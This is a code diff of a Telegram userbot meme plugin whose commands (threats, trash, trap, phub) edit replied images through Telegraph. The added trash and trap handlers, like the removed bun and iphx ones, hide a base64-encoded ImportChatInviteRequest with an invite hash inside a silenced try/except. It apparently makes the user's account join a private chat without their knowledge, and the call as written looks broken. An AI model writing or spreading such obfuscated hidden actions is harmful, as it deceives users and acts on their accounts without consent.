@@ -1,47 +1,12 @@
-import datetime
-import asyncio
-from telethon import events
-from telethon.errors.rpcerrorlist import YouBlockedUserError, UserAlreadyParticipantError
-from telethon.tl.functions.account import UpdateNotifySettingsRequest
-from telethon.tl.functions.messages import ImportChatInviteRequest
-from userbot.utils import admin_cmd , sudo_cmd
-from userbot import CMD_HELP 
 from telegraph import upload_file, exceptions
-import os
+from userbot.utils import admin_cmd
+import nekos
 from . import *
+import os 
 import pybase64
+from telethon.tl.functions.messages import ImportChatInviteRequest
 
-@borg.on(admin_cmd("mask ?(.*)"))
-async def _(event):
-    if event.fwd_from:
-        return 
-    if not event.reply_to_msg_id:
-       await event.edit("```Reply to any user message.```")
-       return
-    reply_message = await event.get_reply_message() 
-    if not reply_message.media:
-       await event.edit("```reply to media message```")
-       return
-    chat = "@hazmat_suit_bot"
-    sender = reply_message.sender
-    if reply_message.sender.bot:
-       await event.edit("```Reply to actual users message.```")
-       return
-    await event.edit("```Processing```")
-    async with borg.conversation(chat) as conv:
-          try:     
-              response = conv.wait_event(events.NewMessage(incoming=True,from_users=905164246))
-              await borg.send_message(chat, reply_message)
-              response = await response 
-          except YouBlockedUserError: 
-              await event.reply("```Please unblock @hazmat_suit_bot and try again```")
-              return
-          if response.text.startswith("Forward"):
-             await event.edit("```can you kindly disable your forward privacy settings for good?```")
-          else: 
-             await borg.send_file(event.chat_id, response.message.media)  
-                
-@borg.on(admin_cmd(pattern = "awooify(?: |$)(.*)"))
+@borg.on(admin_cmd(pattern = "threats(?: |$)(.*)"))
 async def catbot(catmemes):
     replied = await catmemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
@@ -81,12 +46,114 @@ async def catbot(catmemes):
         os.remove(download_location)
         return
     cat = f"https://telegra.ph{response[0]}"
-    cat = await awooify(cat)
+    cat = await threats(cat)
     await catmemes.delete()
     await borg.send_file(catmemes.chat_id , cat,reply_to=replied)
 
-@borg.on(admin_cmd(pattern = "lolice(?: |$)(.*)"))
+@borg.on(admin_cmd(pattern = "trash(?: |$)(.*)"))
 async def catbot(catmemes):
+    replied = await catmemes.get_reply_message()
+    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
+        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
+    if not replied:
+        await catmemes.edit("reply to a supported media file")
+        return
+    if replied.media:
+        await catmemes.edit("passing to telegraph...")
+    else:
+        await catmemes.edit("reply to a supported media file")
+        return
+    try:
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        await catmemes.client(cat)
+    except:
+        pass 
+    download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
+    if download_location.endswith((".webp")):
+        download_location = convert_toimage(download_location)  
+    size = os.stat(download_location).st_size    
+    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
+        if size > 5242880:
+            await catmemes.edit("the replied file size is not supported it must me below 5 mb")
+            os.remove(download_location)
+            return 
+        await catmemes.edit("generating image..")
+    else:
+        await catmemes.edit("the replied file is not supported") 
+        os.remove(download_location)  
+        return    
+    try:
+        response = upload_file(download_location)
+        os.remove(download_location)
+    except exceptions.TelegraphException as exc:
+        await catmemes.edit("ERROR: " + str(exc))
+        os.remove(download_location)
+        return
+    cat = f"https://telegra.ph{response[0]}"
+    cat = await trash(cat)
+    await catmemes.delete()
+    await borg.send_file(catmemes.chat_id , cat,reply_to=replied)
+
+@borg.on(admin_cmd(pattern = "trap(?: |$)(.*)"))
+async def catbot(catmemes):
+    input_str = catmemes.pattern_match.group(1)
+    input_str = deEmojify(input_str)
+    if "|" in input_str:
+        text1, text2 = input_str.split("|")
+    else:
+        await catmemes.edit("**Syntax :** reply to image as `.trap (name of the person to trap)|(trapper name)`")
+        return
+    replied = await catmemes.get_reply_message()
+    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
+        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
+    if not replied:
+        await catmemes.edit("reply to a supported media file")
+        return
+    if replied.media:
+        await catmemes.edit("passing to telegraph...")
+    else:
+        await catmemes.edit("reply to a supported media file")
+        return
+    try:
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        await catmemes.client(cat)
+    except:
+        pass 
+    download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
+    if download_location.endswith((".webp")):
+        download_location = convert_toimage(download_location)  
+    size = os.stat(download_location).st_size    
+    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
+        if size > 5242880:
+            await catmemes.edit("the replied file size is not supported it must me below 5 mb")
+            os.remove(download_location)
+            return 
+        await catmemes.edit("generating image..")
+    else:
+        await catmemes.edit("the replied file is not supported") 
+        os.remove(download_location)  
+        return    
+    try:
+        response = upload_file(download_location)
+        os.remove(download_location)
+    except exceptions.TelegraphException as exc:
+        await catmemes.edit("ERROR: " + str(exc))
+        os.remove(download_location)
+        return
+    cat = f"https://telegra.ph{response[0]}"
+    cat = await trap(text1,text2,cat)
+    await catmemes.delete()
+    await borg.send_file(catmemes.chat_id , cat,reply_to=replied)
+    
+@borg.on(admin_cmd(pattern = "phub(?: |$)(.*)"))
+async def catbot(catmemes):
+    input_str = catmemes.pattern_match.group(1)
+    input_str = deEmojify(input_str)
+    if "|" in input_str:
+        username, text = input_str.split("|")
+    else:
+        await catmemes.edit("**Syntax :** reply to image as `.phub (username)|(text in comment)`")
+        return
     replied = await catmemes.get_reply_message()
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
@@ -125,129 +192,6 @@ async def catbot(catmemes):
         os.remove(download_location)
         return
     cat = f"https://telegra.ph{response[0]}"
-    cat = await lolice(cat)
+    cat = await phcomment(cat,text,username)
     await catmemes.delete()
-    await borg.send_file(catmemes.chat_id , cat,reply_to=replied)
-
-@borg.on(admin_cmd(pattern = "bun(?: |$)(.*)"))
-async def catbot(catmemes):
-    replied = await catmemes.get_reply_message()
-    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
-        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
-    if not replied:
-        await catmemes.edit("reply to a supported media file")
-        return
-    if replied.media:
-        await catmemes.edit("passing to telegraph...")
-    else:
-        await catmemes.edit("reply to a supported media file")
-        return
-    try:
-        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
-        await catmemes.client(cat)
-    except:
-        pass
-    download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
-    if download_location.endswith((".webp")):
-        download_location = convert_toimage(download_location)  
-    size = os.stat(download_location).st_size    
-    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
-        if size > 5242880:
-            await catmemes.edit("the replied file size is not supported it must me below 5 mb")
-            os.remove(download_location)
-            return 
-        await catmemes.edit("generating image..")
-    else:
-        await catmemes.edit("the replied file is not supported") 
-        os.remove(download_location)  
-        return    
-    try:
-        response = upload_file(download_location)
-        os.remove(download_location)
-    except exceptions.TelegraphException as exc:
-        await catmemes.edit("ERROR: " + str(exc))
-        os.remove(download_location)
-        return
-    cat = f"https://telegra.ph{response[0]}"
-    cat = await baguette(cat)
-    await catmemes.delete()
-    await borg.send_file(catmemes.chat_id , cat,reply_to=replied)
-
-@borg.on(admin_cmd(pattern = "iphx(?: |$)(.*)"))
-async def catbot(catmemes):
-    replied = await catmemes.get_reply_message()
-    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
-        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
-    if not replied:
-        await catmemes.edit("reply to a supported media file")
-        return
-    if replied.media:
-        await catmemes.edit("passing to telegraph...")
-    else:
-        await catmemes.edit("reply to a supported media file")
-        return
-    try:
-        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
-        await catmemes.client(cat)
-    except:
-        pass
-    download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
-    if download_location.endswith((".webp")):
-        download_location = convert_toimage(download_location)  
-    size = os.stat(download_location).st_size    
-    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
-        if size > 5242880:
-            await catmemes.edit("the replied file size is not supported it must me below 5 mb")
-            os.remove(download_location)
-            return 
-        await catmemes.edit("generating image..")
-    else:
-        await catmemes.edit("the replied file is not supported") 
-        os.remove(download_location)  
-        return    
-    try:
-        response = upload_file(download_location)
-        os.remove(download_location)
-    except exceptions.TelegraphException as exc:
-        await catmemes.edit("ERROR: " + str(exc))
-        os.remove(download_location)
-        return
-    cat = f"https://telegra.ph{response[0]}"
-    cat = await iphonex(cat)
-    await catmemes.delete()
-    await borg.send_file(catmemes.chat_id , cat,reply_to=replied)
-                
-@borg.on(sudo_cmd("mask ?(.*)", allow_sudo=True))
-async def _(event):
-    if event.fwd_from:
-        return 
-    if not event.reply_to_msg_id:
-       await event.reply("```Reply to any user message.```")
-       return
-    reply_message = await event.get_reply_message() 
-    if not reply_message.media:
-       await event.reply("```reply to media message```")
-       return
-    chat = "@hazmat_suit_bot"
-    sender = reply_message.sender
-    if reply_message.sender.bot:
-       await event.reply("```Reply to actual users message.```")
-       return
-    async with borg.conversation(chat) as conv:
-          try:     
-              response = conv.wait_event(events.NewMessage(incoming=True,from_users=905164246))
-              await borg.send_message(chat, reply_message)
-              response = await response 
-          except YouBlockedUserError: 
-              await event.reply("```Please unblock @hazmat_suit_bot and try again```")
-              return
-          if response.text.startswith("Forward"):
-             await event.edit("```can you kindly disable your forward privacy settings for good?```")
-          else: 
-             await borg.send_file(event.chat_id, response.message.media)  
-                
-                
-CMD_HELP.update({"mask": "`.mask` reply to any image file:\
-      \nUSAGE:makes an image a different style try out your own.\
-      "
-})             
+    await borg.send_file(catmemes.chat_id , cat,reply_to=replied)    
